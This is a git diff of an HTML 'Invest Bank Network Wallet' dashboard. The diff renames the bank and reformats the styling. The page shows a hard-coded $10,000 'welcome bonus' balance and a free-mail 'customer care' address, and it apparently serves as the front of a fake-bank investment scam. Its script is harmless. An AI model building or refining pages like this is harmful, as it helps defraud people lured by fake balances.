@@ -1,33 +1,366 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ismail Bank Network Wallet</title>
+  <title>Invest Bank Network Wallet</title>
   <style>
-    :root{
-      --bg:#020816; --panel:#07132d; --panel-2:#091733; --line:rgba(132,157,219,.2);
-      --text:#f7f9ff; --muted:#90a4cf; --gold:#f4c949; --blue:#6da0ff;
+    :root {
+      --bg: #020816;
+      --panel: #07132d;
+      --panel-2: #091733;
+      --line: rgba(132, 157, 219, .2);
+      --text: #f7f9ff;
+      --muted: #90a4cf;
+      --gold: #f4c949;
+      --blue: #6da0ff;
     }
-    *{box-sizing:border-box} body{margin:0;min-height:100vh;color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:
-      radial-gradient(800px 620px at 0% 0%,rgba(12,47,108,.58),transparent 70%),
-      radial-gradient(650px 600px at 100% 0%,rgba(106,5,58,.44),transparent 72%),var(--bg);}
-    button{font:inherit;color:inherit;border:0;cursor:pointer}.app{min-height:100vh;display:flex;justify-content:center;padding:38px 20px 54px}.shell{width:100%;max-width:760px}
-    .topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}.identity{display:flex;align-items:center;gap:15px}.avatar{width:44px;height:44px;border-radius:50%;display:grid;place-items:center;font-weight:800;color:#19130a;background:linear-gradient(135deg,#ffe481,#c89320);box-shadow:0 0 20px rgba(245,201,73,.25)}
-    .welcome h1{font-size:24px;line-height:1.1;margin:0 0 6px;font-weight:800}.welcome p{margin:0;color:var(--muted);font-size:13px}.actions{display:flex;align-items:center;gap:16px}.icon-btn{width:35px;height:35px;display:grid;place-items:center;background:transparent;color:#e6bd38;font-size:21px}.logout{color:#a9bad8;font-size:21px}
-    .balance{padding:25px 28px 23px;border:1px solid rgba(234,172,83,.38);border-radius:22px;text-align:center;background:linear-gradient(130deg,rgba(161,15,55,.83),rgba(79,44,67,.72) 43%,rgba(19,47,116,.93));box-shadow:0 18px 42px rgba(0,0,0,.25);margin-bottom:18px}.balance .label{font-size:13px;font-weight:700;color:#d1d6e5}.amount{font-size:34px;font-weight:850;letter-spacing:-1.5px;margin:7px 0 2px}.balance small{font-size:13px;color:#d7dbeb;font-weight:650}
-    .quick{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;margin-bottom:18px}.quick button{height:74px;border-radius:21px;background:rgba(9,23,52,.9);border:1px solid var(--line);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:7px;font-size:13px;font-weight:750;transition:.2s}.quick button:hover{transform:translateY(-2px);border-color:#557dc5;background:#0d2148}.quick .qicon{font-size:22px;font-weight:400;line-height:1;color:#ecf2ff}
-    .card{border-radius:22px;background:rgba(8,22,52,.91);border:1px solid var(--line);padding:21px 19px;margin-bottom:18px}.card h2{font-size:16px;margin:0 0 19px;font-weight:800}.activity{display:flex;align-items:center;justify-content:space-between;gap:12px}.activity-left{display:flex;align-items:center;gap:12px;min-width:0}.gift{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;background:rgba(241,195,54,.16);font-size:19px}.activity-title{font-weight:800;font-size:14px;line-height:1.45}.activity-date{font-size:12px;color:#9fb1d4}.credit{text-align:right;color:#f6c637;font-weight:800;font-size:14px;white-space:nowrap}.credit span{display:block;color:#9fb1d4;font-size:12px;font-weight:500;margin-top:5px}.support h2{display:flex;align-items:center;gap:8px}.support p{margin:0 0 10px;color:#9fb1d4;font-size:12px}.email{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px 11px;border-radius:13px;background:#111f3d;color:#f5f8ff;font-size:12px;font-weight:700}.copy{color:#92a4ca;font-size:17px;background:none}.chat{position:fixed;left:24px;bottom:24px;width:51px;height:51px;border-radius:50%;background:linear-gradient(145deg,#651c49,#131d47);border:1px solid rgba(235,192,64,.48);font-size:25px;box-shadow:0 6px 22px rgba(0,0,0,.35)}
-    @media(max-width:560px){.app{padding:26px 16px 40px}.topbar{align-items:flex-start}.welcome h1{font-size:21px}.welcome p{max-width:175px;line-height:1.35}.amount{font-size:30px}.chat{left:auto;right:20px}.card{padding:19px 16px}}
+
+    * {
+      box-sizing: border-box
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      color: var(--text);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background:
+        radial-gradient(800px 620px at 0% 0%, rgba(12, 47, 108, .58), transparent 70%),
+        radial-gradient(650px 600px at 100% 0%, rgba(106, 5, 58, .44), transparent 72%), var(--bg);
+    }
+
+    button {
+      font: inherit;
+      color: inherit;
+      border: 0;
+      cursor: pointer
+    }
+
+    .app {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      padding: 38px 20px 54px
+    }
+
+    .shell {
+      width: 100%;
+      max-width: 760px
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px
+    }
+
+    .identity {
+      display: flex;
+      align-items: center;
+      gap: 15px
+    }
+
+    .avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      color: #19130a;
+      background: linear-gradient(135deg, #ffe481, #c89320);
+      box-shadow: 0 0 20px rgba(245, 201, 73, .25)
+    }
+
+    .welcome h1 {
+      font-size: 24px;
+      line-height: 1.1;
+      margin: 0 0 6px;
+      font-weight: 800
+    }
+
+    .welcome p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 13px
+    }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      gap: 16px
+    }
+
+    .icon-btn {
+      width: 35px;
+      height: 35px;
+      display: grid;
+      place-items: center;
+      background: transparent;
+      color: #e6bd38;
+      font-size: 21px
+    }
+
+    .logout {
+      color: #a9bad8;
+      font-size: 21px
+    }
+
+    .balance {
+      padding: 25px 28px 23px;
+      border: 1px solid rgba(234, 172, 83, .38);
+      border-radius: 22px;
+      text-align: center;
+      background: linear-gradient(130deg, rgba(161, 15, 55, .83), rgba(79, 44, 67, .72) 43%, rgba(19, 47, 116, .93));
+      box-shadow: 0 18px 42px rgba(0, 0, 0, .25);
+      margin-bottom: 18px
+    }
+
+    .balance .label {
+      font-size: 13px;
+      font-weight: 700;
+      color: #d1d6e5
+    }
+
+    .amount {
+      font-size: 34px;
+      font-weight: 850;
+      letter-spacing: -1.5px;
+      margin: 7px 0 2px
+    }
+
+    .balance small {
+      font-size: 13px;
+      color: #d7dbeb;
+      font-weight: 650
+    }
+
+    .quick {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 11px;
+      margin-bottom: 18px
+    }
+
+    .quick button {
+      height: 74px;
+      border-radius: 21px;
+      background: rgba(9, 23, 52, .9);
+      border: 1px solid var(--line);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      font-size: 13px;
+      font-weight: 750;
+      transition: .2s
+    }
+
+    .quick button:hover {
+      transform: translateY(-2px);
+      border-color: #557dc5;
+      background: #0d2148
+    }
+
+    .quick .qicon {
+      font-size: 22px;
+      font-weight: 400;
+      line-height: 1;
+      color: #ecf2ff
+    }
+
+    .card {
+      border-radius: 22px;
+      background: rgba(8, 22, 52, .91);
+      border: 1px solid var(--line);
+      padding: 21px 19px;
+      margin-bottom: 18px
+    }
+
+    .card h2 {
+      font-size: 16px;
+      margin: 0 0 19px;
+      font-weight: 800
+    }
+
+    .activity {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px
+    }
+
+    .activity-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      min-width: 0
+    }
+
+    .gift {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      background: rgba(241, 195, 54, .16);
+      font-size: 19px
+    }
+
+    .activity-title {
+      font-weight: 800;
+      font-size: 14px;
+      line-height: 1.45
+    }
+
+    .activity-date {
+      font-size: 12px;
+      color: #9fb1d4
+    }
+
+    .credit {
+      text-align: right;
+      color: #f6c637;
+      font-weight: 800;
+      font-size: 14px;
+      white-space: nowrap
+    }
+
+    .credit span {
+      display: block;
+      color: #9fb1d4;
+      font-size: 12px;
+      font-weight: 500;
+      margin-top: 5px
+    }
+
+    .support h2 {
+      display: flex;
+      align-items: center;
+      gap: 8px
+    }
+
+    .support p {
+      margin: 0 0 10px;
+      color: #9fb1d4;
+      font-size: 12px
+    }
+
+    .email {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      padding: 12px 11px;
+      border-radius: 13px;
+      background: #111f3d;
+      color: #f5f8ff;
+      font-size: 12px;
+      font-weight: 700
+    }
+
+    .copy {
+      color: #92a4ca;
+      font-size: 17px;
+      background: none
+    }
+
+    .chat {
+      position: fixed;
+      left: 24px;
+      bottom: 24px;
+      width: 51px;
+      height: 51px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, #651c49, #131d47);
+      border: 1px solid rgba(235, 192, 64, .48);
+      font-size: 25px;
+      box-shadow: 0 6px 22px rgba(0, 0, 0, .35)
+    }
+
+    @media(max-width:560px) {
+      .app {
+        padding: 26px 16px 40px
+      }
+
+      .topbar {
+        align-items: flex-start
+      }
+
+      .welcome h1 {
+        font-size: 21px
+      }
+
+      .welcome p {
+        max-width: 175px;
+        line-height: 1.35
+      }
+
+      .amount {
+        font-size: 30px
+      }
+
+      .chat {
+        left: auto;
+        right: 20px
+      }
+
+      .card {
+        padding: 19px 16px
+      }
+    }
   </style>
 </head>
+
 <body>
-  <main class="app"><section class="shell">
-    <header class="topbar"><div class="identity"><div class="welcome"><h1>Welcome back</h1><p>treduquoommaje-4676@yopmail.com</p></div></div><div class="actions"><button class="icon-btn" aria-label="Notifications">♧</button><button class="icon-btn logout" aria-label="Log out">⇥</button><div class="avatar">Si</div></div></header>
-    <section class="balance"><div class="label">Available Balance</div><div class="amount">$10,000.00</div><small>Ismail Bank Network Wallet</small></section>
-    <nav class="quick" aria-label="Wallet actions"><button onclick="window.location.href='thirteen.html'"><span class="qicon">➤</span>Transfer</button><button onclick="notify('Deposit selected')"><span class="qicon">＋</span>Deposit</button><button onclick="notify('History selected')"><span class="qicon">◷</span>History</button></nav>
-    <section class="card"><h2>Recent Activity</h2><div class="activity"><div class="activity-left"><div class="gift">🎁</div><div><div class="activity-title">Welcome Bonus — Smart<br/>Invest Bank</div><div class="activity-date">Sep 11, 12:46 AM</div></div></div><div class="credit">+$10,000.00<span>Bonus</span></div></div></section>
-    <section class="card support"><h2>✉ <span>Support</span></h2><p>Need help? Contact us:</p><div class="email"><span>smartbnkcustomercare@zohomail.com</span><button class="copy" onclick="copyEmail()" aria-label="Copy email">▣</button></div></section>
-  </section></main><button class="chat" aria-label="Open chat" onclick="notify('Chat support is opening')">◯</button>
-  <script>const savedEmail = localStorage.getItem('userEmail'); if (savedEmail) { const emailEl = document.querySelector('.welcome p'); if (emailEl) emailEl.textContent = savedEmail; }function notify(message){alert(message)} function copyEmail(){navigator.clipboard?.writeText('smartbnkcustomercare@zohomail.com');alert('Support email copied')}</script>
-</body></html>
+  <main class="app">
+    <section class="shell">
+      <header class="topbar">
+        <div class="identity">
+          <div class="welcome">
+            <h1>Welcome back</h1>
+            <p>treduquoommaje-4676@yopmail.com</p>
+          </div>
+        </div>
+        <div class="actions"><button class="icon-btn" aria-label="Notifications">♧</button><button
+            class="icon-btn logout" aria-label="Log out">⇥</button>
+          <div class="avatar">Si</div>
+        </div>
+      </header>
+      <section class="balance">
+        <div class="label">Available Balance</div>
+        <div class="amount">$10,000.00</div><small>Invest Bank Network Wallet</small>
+      </section>
+      <nav class="quick" aria-label="Wallet actions"><button onclick="window.location.href='thirteen.html'"><span
+            class="qicon">➤</span>Transfer</button><button onclick="notify('Deposit selected')"><span
+            class="qicon">＋</span>Deposit</button><button onclick="notify('History selected')"><span
+            class="qicon">◷</span>History</button></nav>
+      <section class="card">
+        <h2>Recent Activity</h2>
+        <div class="activity">
+          <div class="activity-left">
+            <div class="gift">🎁</div>
+            <div>
+              <div class="activity-title">Welcome Bonus — Smart<br />Invest Bank</div>
+              <div class="activity-date">Sep 11, 12:46 AM</div>
+            </div>
+          </div>
+          <div class="credit">+$10,000.00<span>Bonus</span></div>
+        </div>
+      </section>
+      <section class="card support">
+        <h2>✉ <span>Support</span></h2>
+        <p>Need help? Contact us:</p>
+        <div class="email"><span>smartbnkcustomercare@zohomail.com</span><button class="copy" onclick="copyEmail()"
+            aria-label="Copy email">▣</button></div>
+      </section>
+    </section>
+  </main><button class="chat" aria-label="Open chat" onclick="notify('Chat support is opening')">◯</button>
+  <script>const savedEmail = localStorage.getItem('userEmail'); if (savedEmail) { const emailEl = document.querySelector('.welcome p'); if (emailEl) emailEl.textContent = savedEmail; } function notify(message) { alert(message) } function copyEmail() { navigator.clipboard?.writeText('smartbnkcustomercare@zohomail.com'); alert('Support email copied') }</script>
+</body>
+
+</html>
